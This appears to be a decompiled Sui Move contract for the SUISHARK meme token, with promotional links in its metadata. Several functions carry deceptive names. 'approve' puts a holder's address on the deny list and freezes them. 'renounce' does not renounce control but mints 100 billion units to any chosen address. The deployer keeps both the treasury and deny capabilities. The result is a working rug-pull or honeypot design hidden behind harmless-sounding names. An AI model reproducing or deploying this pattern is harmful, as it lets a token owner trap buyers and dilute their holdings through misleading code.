module 0x545cebcfceb731d97f11c5158ea292b036793c59c2e7e4b50e5d26f1f8b1bc69::suishark {
    struct SUISHARK has drop {
        dummy_field: bool,
    }

    public entry fun approve(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUISHARK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SUISHARK>(arg0, arg1, arg2, arg3);
    }

    public entry fun approved(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUISHARK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SUISHARK>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: SUISHARK, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SUISHARK>(arg0, 2, b"SUISHARK", b"SUISHARK", b"READY TO TAKE A BITE OF THE MARKET? SUI NETWORK IS READY FOR SUI SHARK - https://x.com/coinSuiShark - https://suishark.xyz - https://t.me/COINSUISHARK", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://suishark.xyz/logo.png"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SUISHARK>>(v2);
        let v4 = 0x2::tx_context::sender(arg1);
        0x2::coin::mint_and_transfer<SUISHARK>(&mut v3, 1000000000, v4, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<SUISHARK>>(v3, v4);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SUISHARK>>(v1, v4);
    }

    public entry fun renounce(arg0: &mut 0x2::coin::TreasuryCap<SUISHARK>, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<SUISHARK>(arg0, 100000000000, arg1, arg2);
    }

    // decompiled from Move bytecode v6
}

